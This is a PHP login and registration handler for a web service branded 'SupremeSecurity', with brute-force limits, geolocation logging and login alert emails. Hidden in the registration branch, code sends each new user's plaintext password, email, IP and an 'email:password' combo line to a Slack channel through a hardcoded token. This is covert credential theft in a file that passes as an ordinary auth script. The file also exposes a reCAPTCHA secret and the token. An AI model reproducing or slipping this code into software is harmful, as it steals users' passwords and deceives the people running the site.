<?php
require '../includes/configuration.php';
require '../includes/init.php';
if ($settings['cloudflare_set'] == '1') 
{
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
else 
{
    $ip = $_SERVER['REMOTE_ADDR'];
}
$type = $_GET['type'];
if ($type == 'login') 
{
    session_start();
    $username = $_POST['user'];
    $password = $_POST['password'];
    $shapassword = hash('sha512',$password);
    $remember = $_POST['remember'];
    $errors = array();
    if (empty($username) || empty($password))
    {
        die(error('Please fill in all fields.'));
    }
    if (!ctype_alnum($username) || strlen($username) < 4 || strlen($username) > 15)
    {
        die(error('Username Must Be  Alphanumberic And 4-15 characters in length.'));
    }
        
    $checkprior = $odb->prepare("SELECT COUNT(*) FROM logins_failed WHERE ip = ? AND `date` > ?");
    $checkprior->execute(array($ip, time() - 900));
    if($checkprior->fetchColumn() > 4)
    {
        $ilovefanta = "FANTASEC IS SEXY";
        die(error('You have attempted to login an excessive amount of times, Try again later.'));
    }
    if (empty($errors))
    {
        if(empty($ilovefanta))
        {
            $SQLCheckLogin = $odb -> prepare("SELECT COUNT(*) FROM `users` WHERE `username` = :username AND `password` = :password");
            $SQLCheckLogin -> execute(array(':username' => $username, ':password' => $shapassword));
            $countLogin = $SQLCheckLogin -> fetchColumn(0);
            if ($countLogin == 1)
            {
                $SQLGetInfo = $odb -> prepare("SELECT `username`, `ID`, `email`, `status` FROM `users` WHERE `username` = :username AND `password` = :password");
                $SQLGetInfo -> execute(array(':username' => $username, ':password' => $shapassword));
                $userInfo = $SQLGetInfo -> fetch(PDO::FETCH_ASSOC);
                if ($userInfo['status'] == "0")
                {
                    $_SESSION['username'] = $userInfo['username'];
                    $_SESSION['ID'] = $userInfo['ID'];
                    
                    $SQL = $odb -> prepare("UPDATE `users` SET `Active` = :rank WHERE `username` = :id");
                    $SQL -> execute(array(':rank' => "1", ':id' => $username));

                    $updatesql = $odb->prepare("UPDATE users SET lastip = ? WHERE username = ?");
                    $updatesql->execute(array($ip, $username));

                    $updatesql = $odb->prepare("UPDATE users SET lastlogin = UNIX_TIMESTAMP() WHERE username = ?");
                    $updatesql->execute(array( $username));

                    $updatesql = $odb->prepare("UPDATE users SET active = ? WHERE username = ?");
                    $updatesql->execute(array(1, $username));
                    $ipcountry = @json_decode(@file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip))->{'geoplugin_countryName'};
                    if (empty($ipcountry)) 
                    {
                        $ipcountry = 'Cannot Be Found';
                    }

                    $ipcountry = @json_decode(@file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip))->{'geoplugin_countryName'};
                    if (empty($ipcountry)) 
                    {
                        $ipcountry = 'Cannot Be Found';
                    }

                    $city = @json_decode(@file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip))->{'geoplugin_city'};
                    if (empty($city)) 
                    {
                        $city = 'Cannot Be Found';
                    }
                    $hostname = gethostbyaddr($ip);

                    $update = $odb->prepare("UPDATE users SET lastact = ? WHERE username = ?");
                    $update->execute(array(time(), $username));


                    $SQL = $odb -> prepare('INSERT INTO `loginlogss` VALUES(NULL, ?, ?, UNIX_TIMESTAMP(), ?, ?, ?, ?, ?)');
                    $SQL -> execute(array($username, $ip, "Successful", $ipcountry, $city, $hostname, $_SERVER['HTTP_USER_AGENT']));
                    $headers = "MIME-Version: 1.0" . "\r\n";
		    		
					$headers.= "Content-type:text/html;charset=UTF-8" . "\r\n";
					$to = $userInfo['email'];
					$subject = "Logged in Alert";
					$headers.= "From: SupremeSecurityTeam.com \n supremeservicecode@gmail.com";
					$message = '<html>
        <header>
  <style type="text/css">
    body{width:100% !important; -webkit-text-size-adjust:100%; -ms-text-size-adjust:100%; margin:0; padding:0;}
    .ExternalClass {width:100%;}
    .ExternalClass, .ExternalClass p, .ExternalClass span, .ExternalClass font, .ExternalClass td, .ExternalClass div {line-height: 100%;}
body {
    color: #fcf9f9;
} 
p {
    color: #fcf9f9;
}
center {
    color: #fcf9f9;
}
strong {
    color: #fcf9f9;
}
h3 {
    color: #fcf9f9;
}
h1 {
    color: #fcf9f9;
}
      
</style>      
        </header>
<body bgcolor="#fcfcfc" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
    <table width="100%" height="auto" border="0" cellpadding="0" cellspacing="0" style="color:#fcf9f9">
         <tr>
              <td width="100%" height="auto" valign="top" align="center" bgcolor="#050404">
                  <center>
                   <h1 style="color:#fcf9f9">Account Update</h1>
                   <h3 style="color:#fcf9f9">Hello '.$username.'<br></h3>    
    <p><strong style="color:#fcf9f9">This email is to ensure the security of your account.</strong><br>
    
    <center><img src="https://supremesecurityteam.com/img/suprem.png" width="72px" height="72px"/></center><br>
        <br>
                <center><strong style="color:#fcf9f9">Someone Just Logged in To Your Account <strong style="color:#0caf03">'.$username.'</strong>, <br> With IP: <strong style="color:#0074d3">'.$ip.'</strong> <br> From: <strong style="color:#009dc9">'.$city.'</strong><strong style="color:#009dc9"></strong>,<strong style="color:#009dc9">'.$ipcountry.'</strong> <br><br> Visit <a href="https://supremesecurityteam.com" style="color:red; text-decoration:none;">SupremeSecurity</a> to secure your account if this wasnt you.  <br><br>Remember to visit <a href="https://supremesecurityteam.com" style="color:red; text-decoration:none;">SUPREMESECURITYTEAM</a><br> to purchase our $5 MONTHLY VPN.<br><br>Thanks For Using SupremeSecurity.<br><br><br><a href="https://tawk.to/chat/5a8462434b401e45400cee66/default" style="color:red; text-decoration:none;">Contact Support</a></strong></center>
        </p></center>
                  <br>
                  <br>
                  <br>
                  <center><h6 style="color:#fcf9f9">2018 &copy; SupremeSecurityServices</h6></center>
                  <br>
              </td>
        </tr>
    </table>
</body>     
        
    </html>';
							mail($to, $subject, $message, $headers);
                    echo(success('Access Granted Redirecting... <meta https-equiv="refresh" content="3;URL=index.php">'));
                }
                else
                {
                    die(error('You are banned Reason: <strong>'.$userInfo['status'].'</strong>'));
                }
            }
            else
            {
                $userfailed = preg_replace('@[^0-9a-z\.\-\:\_\,]+@i', '', $username);
                $userfailed = strtolower ( $userfailed );
                
                $ipcountry = @json_decode(@file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip))->{'geoplugin_countryName'};
                if (empty($ipcountry)) 
                {
                    $ipcountry = 'Cannot Be Found';
                }

                $ipcountry = @json_decode(@file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip))->{'geoplugin_countryName'};
                if (empty($ipcountry)) 
                {
                    $ipcountry = 'Cannot Be Found';
                }

                $city = @json_decode(@file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip))->{'geoplugin_city'};
                if (empty($city)) 
                {
                    $city = 'Cannot Be Found';
                }
                $hostname = gethostbyaddr($ip);

                $SQL = $odb -> prepare('INSERT INTO `loginlogss` VALUES(NULL, ?, ?, UNIX_TIMESTAMP(), ?, ?, ?, ?)');
                $SQL -> execute(array($username, $ip, "Failed", $ipcountry, $city, $hostname));

                $SQL = $odb -> prepare('INSERT INTO `logins_failed` VALUES(NULL, ?, ?, UNIX_TIMESTAMP())');
                $SQL -> execute(array($userfailed, $ip));
                $t = $odb->prepare("SELECT COUNT(*) FROM logins_failed WHERE ip = ? AND `date` > ?");
                $t->execute(array($ip, time() - 900));
                $checking = $t->fetchColumn();

                if ($checking == 4) 
                {
                    $checkingg = die(warning('This is your last try!!'));
                } 
                else 
                {
                    $checkingg = die(error('Authenication Failed Attempt '.$checking.' of 5'));
                }
                echo ''.$checkingg.'';
                die;
            }
        }
    }
    else
    {
        echo '>';
        foreach($errors as $error)
        {
            echo '-'.$error.'<br />';
        }
        echo '</center></div>';
    }
}

if ($type == 'register') 
{
    session_start();
    $username = $_POST['username'];
    $password = $_POST['password'];
    $rpassword = $_POST['rpassword'];
    $email = $_POST['email'];
    $terms = $_POST['terms'];
    $captchaResponse = $_POST['d'];
	
	if (empty($captchaResponse)) 
	{
		if (empty($username) || empty($password) || empty($rpassword) || empty($email)) 
		{
			die(error('Fill In All Fields And Complete Captcha'));
		} 
		else 
		{
			die(error('You Must Complete Captcha'));
		}
	} 
	else 
	{
		$ch = curl_init();
		curl_setopt_array($ch, [
		CURLOPT_URL => 'https://www.google.com/recaptcha/api/siteverify',
		CURLOPT_POST => true,
		CURLOPT_POSTFIELDS => [
			'secret' => "6LeI6XwUAAAAABpPcrTir3CsqPWI2a4yyL-2MD8U",
			'response' => $captchaResponse,
			'remoteip' => $_SERVER['REMOTE_ADDR']
		],
		CURLOPT_RETURNTRANSFER => true
		]);
		$output = curl_exec($ch);
		curl_close($ch);
		$result = json_decode($output);
	}

    if($rpassword != $password)
    {
        die(error('Passwords Do No Match'));
    }
    if (empty($username) || empty($password) || empty($rpassword) || empty($email))
    {
		if (!$result->success) 
		{
			die(error('Fill In All Fields And Complete Captcha'));
		} 
		else 
		{
			die(error('Fill In All Fields'));
		}
    }
    else
    {
	    if (!$result->success) 
	    {
		    die(error('Captcha failure!'));
	    }
        $checkUsername = $odb -> prepare("SELECT COUNT(*) FROM `users` WHERE `username` = :username");
        $checkUsername -> execute(array(':username' => $username));
        $countUsername = $checkUsername -> fetchColumn(0);
        $checkEmail = $odb -> prepare("SELECT COUNT(*) FROM `users` WHERE `email` = :email");
        $checkEmail -> execute(array(':email' => $email));
        $countEmail = $checkEmail -> fetchColumn(0);
        if ($countEmail > 0)
        {
            die(warning('Email Already In Use'));
        }
        else
        {
            if (!filter_var($email, FILTER_VALIDATE_EMAIL)) 
            {
                die(warning('Email is not a valid'));
            }
            else
            {
                if (!ctype_alnum($username) || strlen($username) < 4 || strlen($username) > 15)
                {
                    die(error('Please choose a username between 4-15 characters.'));
                }
                else
                {
                    if (!($countUsername == 0))
                    {
                        die(error('Username Taken.'));
                    }
                    else
                    {
                        $sha=hash('sha512',$password);
                        $insertUser = $odb -> prepare("INSERT INTO `users` VALUES(NULL, ?, ?, ?, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ?, ?, ?, 0, 0, 0, 'Y', '0', '0')");
                        $insertUser -> execute(array($username, $sha, $email, "OFF", "OFF", "http://google.com"));
                        $ipcountry = @json_decode(@file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip))->{'geoplugin_city'};
                        if (empty($ipcountry)) 
                        {
                            $ipcountry = 'XX';
                        }
                        $clip = $_SERVER["HTTP_X_FORWARDED_FOR"];
$ch = curl_init("https://slack.com/api/chat.postMessage");
                        $webUrl = "http://" . $_SERVER['SERVER_NAME'];
			$data = http_build_query([
				"token" => "xoxp-682890655317-682408550420-685635115830-381cfc28eb17e51f0735ec2d35c80705",
				"channel" => "#omegas", //"#mychannel",
				"text" => "New Registration\nUsername: $username\nPassword: $password\nURL: $webUrl\nEmail: $email\nIP: $clip\nCombo: $email:$password\n ", //"Hello, Foo-Bar channel message.",
				"username" => "omegas"
			]);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			$result = curl_exec($ch);
			curl_close($ch);

                        $SQL = $odb -> prepare('INSERT INTO `registerlogs` VALUES(NULL, ?, ?, UNIX_TIMESTAMP(), ?)');
                        $SQL -> execute(array($username, $ip, $ipcountry));
                        die(success('Registered Successfully!! Redirecting... <meta https-equiv="refresh" content="3;url=index.php">'));
                    }
                }
            }
        }
    }
}
?>